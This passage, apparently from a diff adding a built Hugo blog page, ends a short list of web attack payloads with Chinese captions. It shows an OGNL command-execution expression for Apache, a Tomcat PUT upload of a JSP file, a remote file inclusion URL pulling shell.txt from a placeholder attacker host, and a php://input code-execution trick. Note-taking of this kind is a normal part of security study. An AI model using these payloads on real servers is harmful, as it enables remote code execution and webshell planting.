class="p">(</span><span class="err">&#39;</span><span class="n">os</span><span class="p">.</span><span class="na">name</span><span class="err">&#39;</span><span class="p">).</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="err">&#39;</span><span class="n">win</span><span class="err">&#39;</span><span class="p">))).(</span><span class="err">#</span><span class="n">cmds</span><span class="o">=</span><span class="p">(</span><span class="err">#</span><span class="n">iswin</span><span class="o">?</span><span class="p">{</span><span class="err">&#39;</span><span class="n">cmd</span><span class="p">.</span><span class="na">exe</span><span class="sc">&#39;,&#39;</span><span class="o">/</span><span class="n">c</span><span class="err">&#39;</span><span class="p">,</span><span class="err">#</span><span class="n">cmd</span><span class="p">}:{</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="sc">&#39;,&#39;</span><span class="o">-</span><span class="n">c</span><span class="err">&#39;</span><span class="p">,</span><span class="err">#</span><span class="n">cmd</span><span class="p">})).(</span><span class="err">#</span><span class="n">p</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="err">#</span><span class="n">cmds</span><span class="p">)).(</span><span class="err">#</span><span class="n">p</span><span class="p">.</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">)).(</span><span class="err">#</span><span class="n">process</span><span class="o">=</span><span class="err">#</span><span class="n">p</span><span class="p">.</span><span class="na">start</span><span class="p">()).(</span><span class="nd">@org.apache.commons.io.IOUtils@toString</span><span class="p">(</span><span class="err">#</span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()))}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Apache 任意代码执行漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PUT/hack.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">&lt;%out.print(&#34;Hello, world!&#34;)%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tomcat 任意文件上传漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://[dest_IP]/include.php?page=http://[src_IP]/shell.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程文件包含</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?page=php://input
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在POST请求中填入代码即可远程执行</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.body, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 VZstless
+    </section>
+    
+    <section class="powerby">
+        
+            Maybe making a better tomorrow... <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
